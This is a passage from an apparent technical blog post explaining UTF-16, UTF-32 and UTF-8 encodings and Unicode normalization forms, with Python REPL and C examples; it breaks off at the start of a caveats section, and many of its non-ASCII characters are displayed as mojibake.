<span>&gt;&gt;&gt;</span> <span># BOM read as 0xFFFE and system is LE -&gt; will assume UTF-16BE
</span><span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0xFE</span><span>,</span> <span>0xFF</span><span>,</span> <span>0x00</span><span>,</span> <span>0x61</span><span>,</span> <span>0x00</span><span>,</span> <span>0x62</span><span>,</span> <span>0x00</span><span>,</span> <span>0x63</span><span>]).</span><span>decode</span><span>(</span><span>'utf-16'</span><span>)</span>
<span>'abc'</span>
<span>&gt;&gt;&gt;</span> <span># no BOM, text is BE and system is LE -&gt; will assume UTF-16LE and read garbage
</span><span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0x00</span><span>,</span> <span>0x61</span><span>,</span> <span>0x00</span><span>,</span> <span>0x62</span><span>,</span> <span>0x00</span><span>,</span> <span>0x63</span><span>]).</span><span>decode</span><span>(</span><span>'utf-16'</span><span>)</span>
<span>'ÊÑÄÊàÄÊåÄ'</span>
<span>&gt;&gt;&gt;</span> <span># no BOM, text is BE and UTF-16BE is explicitly specified -&gt; will read the text correctly
</span><span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0x00</span><span>,</span> <span>0x61</span><span>,</span> <span>0x00</span><span>,</span> <span>0x62</span><span>,</span> <span>0x00</span><span>,</span> <span>0x63</span><span>]).</span><span>decode</span><span>(</span><span>'utf-16be'</span><span>)</span>
<span>'abc'</span>
</code></pre></div>

<p>Some decoders may probe the first few codepoints for zeroes to detect the endianness of the stream, which is in general not an amazing idea. As a rule of thumb, UTF-16 text should <strong>never rely on automated endianness detection</strong>, and thus either always start with a BOM or assume a fixed endianness value (which in the vast majority of cases is UTF-16LE, which is what Windows does).</p>

<h3 id="utf-32">UTF-32</h3>
<p>Just as UTF-16 is an extension of UCS-2, <strong>UTF-32</strong> is an evolution of UCS-4. Compared to all other UTF encodings, UTF-32 is by far the simplest, because like its predecessor it is a <strong>fixed-width encoding</strong>.</p>

<p>The major difference between UCS-4 and UTF-32 is that the latter has been limited down 21 bits, from its maximum of 31 bits (UCS-4 was signed). This has been done to maintain compatibility with UTF-16, which is constrained by its design to only represent codepoints up to <code>U+10FFFF</code>.</p>

<p>While UTF-32 seems convenient at first, it is not in practice all that useful, for quite a few reasons:</p>

<ol>
  <li>
    <p>UTF-32 is outrageously wasteful because all characters, including those belonging to the ASCII plane, are represented using 4 bytes. Given that the vast majority of text uses ASCII characters for markup, content or both, UTF-32 encoded text tends to be mostly comprised of just a few significant bytes scattered in between a sea of zeroes:</p>

    <div><pre><code> <span>&gt;&gt;&gt;</span> <span># UTF-32BE encoded text with BOM
</span> <span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0xFE</span><span>,</span> <span>0xFF</span><span>,</span> <span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0x61</span><span>,</span> <span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0x62</span><span>,</span> <span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0x00</span><span>,</span> <span>0x63</span><span>]).</span><span>decode</span><span>(</span><span>'utf-32'</span><span>)</span>
 <span>'abc'</span>
 <span>&gt;&gt;&gt;</span> <span># The same, but in UTF-16BE
</span> <span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0xFE</span><span>,</span> <span>0xFF</span><span>,</span> <span>0x00</span><span>,</span> <span>0x61</span><span>,</span> <span>0x00</span><span>,</span> <span>0x62</span><span>,</span> <span>0x00</span><span>,</span> <span>0x63</span><span>]).</span><span>decode</span><span>(</span><span>'utf-16'</span><span>)</span>
 <span>'abc'</span>
 <span>&gt;&gt;&gt;</span> <span># The same, but in ASCII
</span> <span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0x61</span><span>,</span> <span>0x62</span><span>,</span> <span>0x63</span><span>]).</span><span>decode</span><span>(</span><span>'ascii'</span><span>)</span>
 <span>'abc'</span>
</code></pre></div>
  </li>
  <li>
    <p>No major OS or software uses UTF-32 as its internal encoding as far as I‚Äôm aware of. While locales in modern UNIX systems usually define <code>wchar_t</code> as representing UTF-32 codepoints, they are seldom used due to most software in existence assuming that <code>wchar_t</code> is 16-bit wide.</p>

    <p>On Linux, for instance:</p>

    <div><pre><code> <span>#include &lt;locale.h&gt;
</span> <span>#include &lt;stdio.h&gt;
</span> <span>#include &lt;wchar.h&gt;
</span>
 <span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
     <span>// one of the bajilion ways to set a Unicode locale - we'll talk UTF-8 later</span>
     <span>setlocale</span><span>(</span><span>LC_ALL</span><span>,</span> <span>"en_US.UTF-8"</span><span>);</span> 
     <span>const</span> <span>wchar_t</span> <span>s</span><span>[]</span> <span>=</span> <span>L"abc"</span><span>;</span>

     <span>printf</span><span>(</span><span>"sizeof(wchar_t) == %zu</span><span>\n</span><span>"</span><span>,</span> <span>sizeof</span> <span>*</span><span>s</span><span>);</span> <span>// 4</span>
     <span>printf</span><span>(</span><span>"wcslen(s) == %zu</span><span>\n</span><span>"</span><span>,</span> <span>wcslen</span><span>(</span><span>s</span><span>));</span> <span>// 3</span>
     <span>printf</span><span>(</span><span>"bytes in s == %zu</span><span>\n</span><span>"</span><span>,</span> <span>sizeof</span> <span>s</span><span>);</span> <span>// 16 (12 + 4, due to the null terminator)</span>

     <span>return</span> <span>0</span><span>;</span>    
 <span>}</span>
</code></pre></div>
  </li>
  <li>
    <p>The fact UTF-32 is a fixed-width encoding is only marginally useful, due to <em>grapheme clusters still being a thing</em>. This means that the equivalence between codepoints and rendered glyphs is still not 1:1, just like in UCS-4:</p>

    <div><pre><code> <span>// GNU/Linux, x86_64</span>

 <span>#include &lt;locale.h&gt;
</span> <span>#include &lt;stdio.h&gt;
</span> <span>#include &lt;wchar.h&gt;
</span>
 <span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
     <span>setlocale</span><span>(</span><span>LC_ALL</span><span>,</span> <span>"en_US.UTF-8"</span><span>);</span>

     <span>// "canÃÉa", with 'nÃÉ' written as the grapheme cluster "n" + "combining tilde"</span>
     <span>const</span> <span>wchar_t</span> <span>string</span><span>[]</span> <span>=</span> <span>L"can\u0303a"</span><span>;</span>

     <span>wprintf</span><span>(</span><span>L"`%ls`</span><span>\n</span><span>"</span><span>,</span> <span>string</span><span>);</span> <span>// prints "canÃÉa" as 4 glyphs</span>
     <span>wprintf</span><span>(</span><span>L"`%ls` is %zu codepoints long</span><span>\n</span><span>"</span><span>,</span> <span>string</span><span>,</span> <span>wcslen</span><span>(</span><span>string</span><span>));</span> <span>// 5 codepoints</span>
     <span>wprintf</span><span>(</span><span>L"`%ls` is %zu bytes long</span><span>\n</span><span>"</span><span>,</span> <span>string</span><span>,</span> <span>sizeof</span> <span>string</span><span>);</span> <span>// 24 bytes (5 UCS-4 codepoints + null)</span>

     <span>// this other string is the same as the previous one, but with the precomposed "nÃÉ" character</span>
     <span>const</span> <span>wchar_t</span> <span>probe</span><span>[]</span> <span>=</span> <span>L"ca\u00F1a"</span><span>;</span>

     <span>const</span> <span>_Bool</span> <span>different</span> <span>=</span> <span>wcscmp</span><span>(</span><span>string</span><span>,</span> <span>probe</span><span>);</span>

     <span>// this will always print "different", because the two strings are not the same despite being identical</span>
     <span>wprintf</span><span>(</span><span>L"`%ls` and `%ls` are %s</span><span>\n</span><span>"</span><span>,</span> <span>string</span><span>,</span> <span>probe</span><span>,</span> <span>different</span> <span>?</span> <span>"different"</span> <span>:</span> <span>"equal"</span><span>);</span>

     <span>return</span> <span>0</span><span>;</span>
 <span>}</span>
</code></pre></div>

    <div><pre><code> <span>$ </span>cc <span>-o</span> widestr_test widestr_test.c <span>-std</span><span>=</span>c11
 <span>$ </span>./widestr_test
 <span>`</span>canÃÉa<span>`</span>
 <span>`</span>canÃÉa<span>`</span> is 5 codepoints long
 <span>`</span>canÃÉa<span>`</span> is 24 bytes long
 <span>`</span>canÃÉa<span>`</span> and <span>`</span>ca√±a<span>`</span> are different
</code></pre></div>

    <p>This is by far the biggest letdown about UTF-32: it is not the ultimate ‚Äúextended ASCII‚Äù encoding most people wished for, because it is still incorrect so iterate over characters, and it still requires normalization <em>(see below)</em> in order to be safely operated on character by character.</p>
  </li>
</ol>

<h3 id="utf-8">UTF-8</h3>

<p>I left <strong>UTF-8</strong> as last because it is by far the best among the crop of Unicode encodings <sup id="fnref:9" role="doc-noteref"><a href="#fn:9" rel="footnote">7</a></sup>. UTF-8 is a variable width encoding, just like UTF-16, but with the crucial advantage that <strong>UTF-8 uses byte-sized (8-bit) code units</strong>, just like ASCII.</p>

<p>This is a major advantage, for a series of reasons:</p>

<ol>
  <li>All ASCII text is valid UTF-8, and ASCII itself is in UTF-8, limited to the codepoints between <code>U+0000</code> and <code>U+007F</code>.
    <ul>
      <li>This also implies that UTF-8 can encode ASCII text with one byte per character, even when mixed up with non-Latin characters;</li>
      <li>Editors, terminals and other software can just support UTF-8 without having to support a separate ASCII mode;</li>
    </ul>
  </li>
  <li>
    <p>UTF-8 doesn‚Äôt require bothering with endianness, because bytes are just that - bytes. This means that UTF-8 does not require a BOM, even though poorly designed software may still add one <em>(see below)</em>;</p>
  </li>
  <li>UTF-8 doesn‚Äôt need a wide char type, like <code>wchar_t</code> or <code>char16_t</code>. Old APIs can use classic byte-sized <code>chars</code>, and just disregard characters above <code>U+007F</code>.</li>
</ol>

<p>The following is an arguably poorly designed C program that parses a basic key-value file format defined as follows:</p>

<div><pre><code>key1:value1
key2:value2
key\:3:value3
</code></pre></div>

<div><pre><code><span>#include &lt;stddef.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span>#define BUFFER_SIZE 1024
</span>
<span>int</span> <span>main</span><span>(</span><span>const</span> <span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>char</span><span>*</span> <span>const</span> <span>argv</span><span>[])</span> <span>{</span>
    <span>if</span> <span>(</span><span>argc</span> <span>!=</span> <span>2</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"usage: %s &lt;file&gt;</span><span>\n</span><span>"</span><span>,</span> <span>argv</span><span>[</span><span>0</span><span>]);</span>
        <span>return</span> <span>EXIT_FAILURE</span><span>;</span>
    <span>}</span>

    <span>FILE</span><span>*</span> <span>const</span> <span>file</span> <span>=</span> <span>fopen</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>],</span> <span>"r"</span><span>);</span>

    <span>if</span> <span>(</span><span>!</span><span>file</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"error: could not open file `%s`</span><span>\n</span><span>"</span><span>,</span> <span>argv</span><span>[</span><span>1</span><span>]);</span>
        <span>return</span> <span>EXIT_FAILURE</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>retval</span> <span>=</span> <span>EXIT_SUCCESS</span><span>;</span>

    <span>char</span><span>*</span> <span>line</span> <span>=</span> <span>malloc</span><span>(</span><span>BUFFER_SIZE</span><span>);</span>
    <span>if</span> <span>(</span><span>!</span><span>line</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"error: could not allocate memory</span><span>\n</span><span>"</span><span>);</span>
        
        <span>goto</span> <span>end</span><span>;</span>
    <span>}</span>

    <span>size_t</span> <span>line_size</span> <span>=</span> <span>BUFFER_SIZE</span><span>;</span>
    <span>ptrdiff_t</span> <span>key_offs</span> <span>=</span> <span>-</span><span>1</span><span>,</span> <span>pos</span> <span>=</span> <span>0</span><span>;</span>
    <span>_Bool</span> <span>escape</span> <span>=</span> <span>0</span><span>;</span>

    <span>for</span> <span>(;;)</span> <span>{</span>
        <span>const</span> <span>int</span> <span>c</span> <span>=</span> <span>fgetc</span><span>(</span><span>file</span><span>);</span>

        <span>switch</span> <span>(</span><span>c</span><span>)</span> <span>{</span>
        <span>case</span> <span>EOF</span><span>:</span>
            <span>goto</span> <span>end</span><span>;</span>
        
        <span>case</span> <span>'\\'</span><span>:</span>
            <span>if</span> <span>(</span><span>!</span><span>escape</span><span>)</span> <span>{</span>
                <span>escape</span> <span>=</span> <span>1</span><span>;</span>
                <span>continue</span><span>;</span>
            <span>}</span>

            <span>break</span><span>;</span>

        <span>case</span> <span>':'</span><span>:</span>
            <span>if</span> <span>(</span><span>!</span><span>escape</span><span>)</span> <span>{</span>
                <span>if</span> <span>(</span><span>key_offs</span> <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
                    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"error: extra `:` at position %td</span><span>\n</span><span>"</span><span>,</span> <span>pos</span><span>);</span>
                    
                    <span>goto</span> <span>end</span><span>;</span>
                <span>}</span>

                <span>key_offs</span> <span>=</span> <span>pos</span><span>;</span>

                <span>continue</span><span>;</span>
            <span>}</span>

            <span>break</span><span>;</span>

        <span>case</span> <span>'\n'</span><span>:</span>
            <span>if</span> <span>(</span><span>escape</span><span>)</span> <span>{</span>
                <span>break</span><span>;</span>
            <span>}</span>

            <span>if</span> <span>(</span><span>key_offs</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
                <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"error: missing `:`</span><span>\n</span><span>"</span><span>);</span>

                <span>goto</span> <span>end</span><span>;</span>
            <span>}</span>

            <span>printf</span><span>(</span><span>"key: `%.*s`, value: `%.*s`</span><span>\n</span><span>"</span><span>,</span> <span>(</span><span>int</span><span>)</span><span>key_offs</span><span>,</span> <span>line</span><span>,</span> <span>(</span><span>int</span><span>)(</span><span>pos</span> <span>-</span> <span>key_offs</span><span>),</span> <span>line</span> <span>+</span> <span>key_offs</span><span>);</span>

            <span>key_offs</span> <span>=</span> <span>-</span><span>1</span><span>;</span>
            <span>pos</span> <span>=</span> <span>0</span><span>;</span>

            <span>continue</span><span>;</span>
        <span>}</span>

        <span>if</span> <span>((</span><span>size_t</span><span>)</span> <span>pos</span> <span>&gt;=</span> <span>line_size</span><span>)</span> <span>{</span>
            <span>line_size</span> <span>=</span> <span>line_size</span> <span>*</span> <span>3</span> <span>/</span> <span>2</span><span>;</span>
            <span>line</span> <span>=</span> <span>realloc</span><span>(</span><span>line</span><span>,</span> <span>line_size</span><span>);</span>

            <span>if</span> <span>(</span><span>!</span><span>line</span><span>)</span> <span>{</span>
                <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"error: could not allocate memory</span><span>\n</span><span>"</span><span>);</span>

                <span>goto</span> <span>end</span><span>;</span>
            <span>}</span>
        <span>}</span>

        <span>line</span><span>[</span><span>pos</span><span>++</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
        <span>escape</span> <span>=</span> <span>0</span><span>;</span>
    <span>}</span>

<span>end:</span>
    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>fclose</span><span>(</span><span>file</span><span>);</span>

    <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div>

<div><pre><code><span>$ </span>cc <span>-o</span> kv kv.c <span>-std</span><span>=</span>c11
<span>$ </span><span>cat </span>kv_test.txt
key1:value1
key2:value2
key<span>\:</span>3:value3
<span>$ </span>./kv kv_test.txt
key: <span>`</span>key1<span>`</span>, value: <span>`</span>value1<span>`</span>
key: <span>`</span>key2<span>`</span>, value: <span>`</span>value2<span>`</span>
key: <span>`</span>key:3<span>`</span>, value: <span>`</span>value3<span>`</span>
</code></pre></div>

<p>This program operates on files <code>char</code> by <code>char</code> (or rather, <code>int</code> by <code>int</code> - that‚Äôs a long story), using whatever the ‚Äúnative‚Äù 8-bit (‚Äúnarrow‚Äù) execution character set is to match for basic ASCII characters such as <code>:</code>, <code>\</code> and <code>\n</code>.</p>

<p>The beauty of UTF-8 is that code that splits, searches or synchronises using ASCII <em>symbols</em><sup id="fnref:10" role="doc-noteref"><a href="#fn:10" rel="footnote">8</a></sup> will work fine as-is, with little to no modification, even with Unicode text.</p>

<p>Standard C character literals will still be valid Unicode codepoints, as long as the encoding of the source file is UTF-8. In the file above, <code>':'</code> and other ASCII literals will fit in a char (int, really) as long as they are encoded as ASCII (<code>:</code> is <code>U+003A</code>).</p>

<p>Like UTF-16, UTF-8 is self-synchronizing: the code-splitting logic above will never match a UTF-8 codepoint in the middle, given that ASCII is reserved all of the codepoints between <code>U+0000</code> and <code>U+007F</code>. The text can then be returned to the UTF-8 compliant system as it is, and the Unicode text will be correctly rendered.</p>

<div><pre><code><span>$ </span><span>cat </span>kv_test_utf8.txt
tcp:127.0.0.1
Affet, affet:Yalvarƒ±yorum
Why? üòí:bl√•b√¶r
Spla<span>\:</span>too:3u33
<span>$ </span>./kv kv_test_utf8.txt
key: <span>`</span>tcp<span>`</span>, value: <span>`</span>127.0.0.1<span>`</span>
key: <span>`</span>Affet, affet<span>`</span>, value: <span>`</span>Yalvarƒ±yorum<span>`</span>
key: <span>`</span>Why? üòí<span>`</span>, value: <span>`</span>bl√•b√¶r<span>`</span>
key: <span>`</span>Spla:too<span>`</span>, value: <span>`</span>3u33<span>`</span>
</code></pre></div>

<h2 id="unicode-normalization">Unicode Normalization</h2>

<p>As I previously mentioned, Unicode codepoints can be modified using combining characters, and the standard supports precomposed forms of some characters which have decomposed forms.
The resulting glyphs are visually indistinguishable after being rendered, and there‚Äôs no limitation on using both forms alongside each other in the same text bit of text:</p>

<div><pre><code><span>&gt;&gt;&gt;</span> <span>import</span> <span>unicodedata</span>
<span>&gt;&gt;&gt;</span> <span>s</span> <span>=</span> <span>'St√∂rfaÃàlle'</span>
<span>&gt;&gt;&gt;</span> <span>len</span><span>(</span><span>s</span><span>)</span>
<span>10</span>
<span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>s</span><span>]</span>
<span>[</span><span>'LATIN CAPITAL LETTER S'</span><span>,</span> <span>'LATIN SMALL LETTER T'</span><span>,</span> <span>'LATIN SMALL LETTER O WITH DIAERESIS'</span><span>,</span> <span>'LATIN SMALL LETTER R'</span><span>,</span> <span>'LATIN SMALL LETTER F'</span><span>,</span> <span>'LATIN SMALL LETTER A'</span><span>,</span> <span>'COMBINING DIAERESIS'</span><span>,</span> <span>'LATIN SMALL LETTER L'</span><span>,</span> <span>'LATIN SMALL LETTER L'</span><span>,</span> <span>'LATIN SMALL LETTER E'</span><span>]</span>
<span>&gt;&gt;&gt;</span> <span># getting the last 4 characters actually picks the last 3 glyphs, plus a combining character
</span><span>&gt;&gt;&gt;</span> <span># sometimes the combining character may be mistakenly rendered over the `'` Python prints around the string
</span><span>&gt;&gt;&gt;</span> <span>s</span><span>[</span><span>-</span><span>4</span><span>:]</span>
<span>'Ãàlle'</span>
<span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>s</span><span>[</span><span>-</span><span>4</span><span>:]]</span>
<span>[</span><span>'COMBINING DIAERESIS'</span><span>,</span> <span>'LATIN SMALL LETTER L'</span><span>,</span> <span>'LATIN SMALL LETTER L'</span><span>,</span> <span>'LATIN SMALL LETTER E'</span><span>]</span>
</code></pre></div>

<p>This is a significant issue, given how character-centric our understanding of text is: users (and by extension, developers) expect to be able to count what they see as ‚Äúletters‚Äù, in a way that is consistent with how they are printed, shown on screen or inputted in a text field.</p>

<p>Another headache is the fact Unicode also may define special forms for the same letter or group of letters, which are visibly different but understood by humans to be derived from the same symbol.</p>

<p>A very common example of this is the <code>Ô¨Å</code> (U+FB01), <code>Ô¨Ç</code> (U+FB02), <code>Ô¨Ä</code> (U+FB00) and <code>Ô¨É</code> (U+FB03) ligatures, which are ubiquitous in Latin text as a ‚Äúmore readable‚Äù form of the <code>fi</code>, <code>fl</code> and <code>ffi</code> digraphs. In general, users expect <code>office</code>, <code>ofÔ¨Åce</code> and <code>oÔ¨Éce</code> to be treated and rendered similarly, because they all represent the same identical word, but not necessarily without any visual difference. <sup id="fnref:11" role="doc-noteref"><a href="#fn:11" rel="footnote">9</a></sup></p>

<h3 id="canonical-and-compatibility-equivalence">Canonical and Compatibility Equivalence</h3>

<p>To solve this issue, Unicode defines two different types of equivalence between codepoints (or sequences thereof):</p>

<ul>
  <li>
    <p><strong>Canonical equivalence</strong>, when two combinations of one or more codepoints represent the same ‚Äúabstract‚Äù character, like in the case of <em>‚Äú√±‚Äù</em> and <em>‚Äún + combining tilde‚Äù</em>;</p>
  </li>
  <li>
    <p><strong>Compatibility equivalence</strong>, when two combinations of one or more codepoints more or less represent the same ‚Äúabstract‚Äù character, while being rendered differently or having different semantics, like in the case of <em>‚ÄúÔ¨Å‚Äù</em>, or mathematical signs such as ‚ÄúMathematical Bold Capital A‚Äù (<code>ùêÄ</code>).</p>
  </li>
</ul>

<p>Canonical equivalence is generally considered a stronger form of equivalence than compatibility equivalence: it is critical for text processing tools to be able to treat canonically equivalent characters as the same, otherwise, users may be unable to search, edit or operate on text properly.<sup id="fnref:12" role="doc-noteref"><a href="#fn:12" rel="footnote">10</a></sup> On the other end, users are aware of compatibility equivalent characters due to their different semantic and visual features, so their equivalence becomes relevant only in specific circumstances (like textual search, for instance, or when the user tries to copy ‚Äúfancy‚Äù characters from Word to a text box that only accepts plain text).</p>

<h3 id="normalization-forms">Normalization Forms</h3>

<p>Unicode defines four distinct <strong>normalization forms</strong>, which are specific forms a Unicode text can be in, and which allow for safe comparisons between strings.
The standard describes how text can be transformed into any form, following a specific <em>normalization algorithm</em> based <a href="https://www.unicode.org/charts/normalization/">on per-glyph mappings</a>.</p>

<p>The four normalization forms are:</p>

<ul>
  <li>
    <p><strong>NFD</strong>, or <strong>Normalization Form D</strong>, which applies a single <strong>canonical decomposition</strong> to all characters of a string. In general, this can be assumed to mean that every character that has a <em>canonically-equivalent</em> decomposed form is in it, with all of its modifiers <a href="https://unicode.org/reports/tr15/#Description_Norm">sorted into a canonical order</a>.</p>

    <p>For instance,</p>
    <div><pre><code>  <span>&gt;&gt;&gt;</span> <span>"e</span><span>\u0302\u0323</span><span>"</span>
  <span>'eÃÇÃ£'</span>
  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>"e</span><span>\u0302\u0323</span><span>"</span><span>]</span>
  <span>[</span><span>'LATIN SMALL LETTER E'</span><span>,</span> <span>'COMBINING CIRCUMFLEX ACCENT'</span><span>,</span> <span>'COMBINING DOT BELOW'</span><span>]</span>
  <span>&gt;&gt;&gt;</span> <span>normalized</span> <span>=</span> <span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFD'</span><span>,</span> <span>"e</span><span>\u0302\u0323</span><span>"</span><span>)</span>
  <span>&gt;&gt;&gt;</span> <span>normalized</span>
  <span>'eÃÇÃ£'</span>
  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>normalized</span><span>]</span>
  <span>[</span><span>'LATIN SMALL LETTER E'</span><span>,</span> <span>'COMBINING DOT BELOW'</span><span>,</span> <span>'COMBINING CIRCUMFLEX ACCENT'</span><span>]</span>
</code></pre></div>
    <p>Notice how the circumflex and the dot below were in a noncanonical order and were swapped by the normalization algorithm.</p>
  </li>
  <li>
    <p><strong>NFC</strong>, or <strong>Normalization Form C</strong>, which first applies a <strong>canonical decomposition</strong>, followed by a <strong>canonical composition</strong>. In NFC, all characters are composed into a <em>precomposed character</em>, if possible:</p>

    <div><pre><code>  <span>&gt;&gt;&gt;</span> <span>precomposed</span> <span>=</span> <span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFC'</span><span>,</span> <span>"e</span><span>\u0302\u0323</span><span>"</span><span>)</span>
  <span>&gt;&gt;&gt;</span> <span>precomposed</span>
  <span>'√™Ã£'</span>
  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>precomposed</span><span>]</span>
  <span>[</span><span>'LATIN SMALL LETTER E WITH CIRCUMFLEX AND DOT BELOW'</span><span>]</span>
</code></pre></div>

    <p>Notice that normalizing to NFC <strong>is not enough to ‚Äúcount‚Äù glyphs</strong>, given that some may not be representable with a single codepoint. An example of this is <code>eÃÑÃ£</code>, which has no associated precomposed character:</p>

    <div><pre><code>  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFC'</span><span>,</span> <span>"eÃÑÃ£"</span><span>)]</span>
  <span>[</span><span>'LATIN SMALL LETTER E WITH DOT BELOW'</span><span>,</span> <span>'COMBINING MACRON'</span><span>]</span>
</code></pre></div>

    <p>A particularly nice property of NFC is that by definition all ASCII text is by definition already in NFC, which means that compilers and other tools do not necessarily have to bother with normalization when dealing with source code or scripts. <sup id="fnref:13" role="doc-noteref"><a href="#fn:13" rel="footnote">11</a></sup></p>
  </li>
  <li>
    <p><strong>NFKD</strong>, or <strong>Normalization Form KD</strong>, which applies a <strong>compatibility decomposition</strong> to all characters of a string. Alongside canonical equivalence, Unicode also defines compatibility-equivalent decompositions for certain characters, like the previously mentioned <code>Ô¨Å</code> ligature, which is decomposed into <code>f</code> and <code>i</code>.</p>

    <div><pre><code>  <span>&gt;&gt;&gt;</span> <span>fi</span> <span>=</span> <span>"Ô¨Å"</span>
  <span>&gt;&gt;&gt;</span> <span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>fi</span><span>)</span>
  <span>'LATIN SMALL LIGATURE FI'</span>
  <span>&gt;&gt;&gt;</span> <span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFD'</span><span>,</span> <span>fi</span><span>))</span> <span># doesn't do anything, `Ô¨Å` has no canonical decomposition
</span>  <span>'LATIN SMALL LIGATURE FI'</span>
  <span>&gt;&gt;&gt;</span> <span>decomposed</span> <span>=</span> <span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFKD'</span><span>,</span> <span>"Ô¨Å"</span><span>)</span>
  <span>&gt;&gt;&gt;</span> <span>decomposed</span>
  <span>'fi'</span>
  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>decomposed</span><span>]</span>
  <span>[</span><span>'LATIN SMALL LETTER F'</span><span>,</span> <span>'LATIN SMALL LETTER I'</span><span>]</span>
</code></pre></div>

    <p>Characters that don‚Äôt have a compatibility decomposition are canonically decomposed instead:</p>

    <div><pre><code>  <span>&gt;&gt;&gt;</span> <span>"</span><span>\u1EC7</span><span>"</span>
  <span>'·ªá'</span>
  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFKD'</span><span>,</span> <span>"</span><span>\u1EC7</span><span>"</span><span>)</span>
  <span>[</span><span>'LATIN SMALL LETTER E'</span><span>,</span> <span>'COMBINING DOT BELOW'</span><span>,</span> <span>'COMBINING CIRCUMFLEX ACCENT'</span><span>]</span>
</code></pre></div>
  </li>
  <li>
    <p><strong>NFKC</strong>, or <strong>Normalization Form KC</strong>, which first applies a <strong>compatibility decomposition</strong>, followed by a <strong>canonical composition</strong>. In NFKC, all characters are composed into a <em>precomposed character</em>, if possible:</p>

    <div><pre><code>  <span>&gt;&gt;&gt;</span> <span>precomposed</span> <span>=</span> <span>unicodedata</span><span>.</span><span>normalize</span><span>(</span><span>'NFKC'</span><span>,</span> <span>"Ô¨Å"</span><span>)</span> <span># this is U+FB01, "LATIN SMALL LIGATURE FI"
</span>  <span>&gt;&gt;&gt;</span> <span>precomposed</span>
  <span>'fi'</span>
  <span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>precomposed</span><span>]</span>
 <span>[</span><span>'LATIN SMALL LETTER F'</span><span>,</span> <span>'LATIN SMALL LETTER I'</span><span>]</span> 
</code></pre></div>

    <p>Notice how the composition performed is <em>canonical</em>: there‚Äôs no such thing as ‚Äúcompatibility composition‚Äù as far as my understanding goes. This means that NFKC never recombines characters into compatibility-equivalent forms, which are thus permanently lost:</p>

    <pre><code>  &gt;&gt;&gt; s = "SouÔ¨Äl\u0065\u0301" # notice the `Ô¨Ä` ligature
  &gt;&gt;&gt; s
  'SouÔ¨Äl√©'
  &gt;&gt;&gt; norm = unicodedata.normalize('NFKC', s) 
  &gt;&gt;&gt; norm
  'Souffl√©'
  &gt;&gt;&gt; # the ligature is gone, but the accent is still there
</code></pre>
  </li>
</ul>

<p>All in all, normalization is a fairly complex topic, and it‚Äôs especially tricky to implement right due to the sheer amount of special cases, so it‚Äôs always best to rely on libraries in order to get it right.</p>

<h2 id="unicode-in-the-wild-caveats">Unicode in the wild: caveats</h2>

<p>Unicode is the de facto only relevant character set in existence, with UTF-8 detaining the status of best encoding.</p>

<p>Unfortunately, internationalization support introduces a great deal of complexity into text handling, something that developers are often unaware of:</p>

<ol>
  <li>
